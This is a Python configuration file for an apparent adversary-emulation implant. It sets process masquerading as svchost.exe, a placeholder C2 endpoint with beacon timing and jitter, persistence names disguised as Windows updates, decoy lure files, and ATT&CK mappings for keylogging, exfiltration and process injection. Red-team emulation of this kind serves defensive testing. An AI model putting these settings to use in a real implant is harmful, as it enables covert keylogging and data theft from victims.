# Configuration file for the APT emulation system
# All configuration constants are centralized here

# Operational Security Settings
SILENT_MODE = True
DEBUG_MODE = False
PROCESS_NAME_MASQUERADE = "svchost.exe"
HIDE_CONSOLE = True

# C2 Server Configuration
C2_SERVER = 'https://your-c2-server.com/api'
TRANSMISSION_INTERVAL = 900  # 15 minutes in seconds
C2_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
C2_TIMEOUT = 30
C2_MAX_RETRIES = 3

# File Paths
LOG_FILE = 'system_logs.json'
PAYLOAD_SCRIPT = 'payload.py'
PERSISTENCE_KEY_NAME = "WindowsSecurityUpdate"
SCHEDULED_TASK_NAME = "SystemMaintenanceTask"

# Stealth Settings
JITTER_MIN = 1
JITTER_MAX = 5
RETRY_DELAY_MIN = 5
RETRY_DELAY_MAX = 15

# Believable files to create as decoys
BELIEVABLE_FILES = {
    'HelpDesk_Password_Reset_Procedure.pdf': 'PDF content for password reset procedures',
    'VPN_Config_2026.mobileconfig': 'Mobile configuration profile for VPN access',
    'WiFiSSO_Upgrade_Instructions.docx': 'WiFi Single Sign-On upgrade documentation',
    'IT-Asset-Register.xlsx': 'IT asset inventory and management spreadsheet'
}

# MITRE ATT&CK Technique Mapping
MITRE_TECHNIQUES = {
    'T1082': 'System Information Discovery',
    'T1056.001': 'Input Capture: Keylogging',
    'T1041': 'Exfiltration Over C2 Channel',
    'T1547.001': 'Boot or Logon Autostart Execution: Registry Run Keys',
    'T1053.005': 'Scheduled Task/Job: Scheduled Task',
    'T1071.001': 'Application Layer Protocol: Web Protocols',
    'T1027': 'Obfuscated Files or Information',
    'T1055': 'Process Injection'
}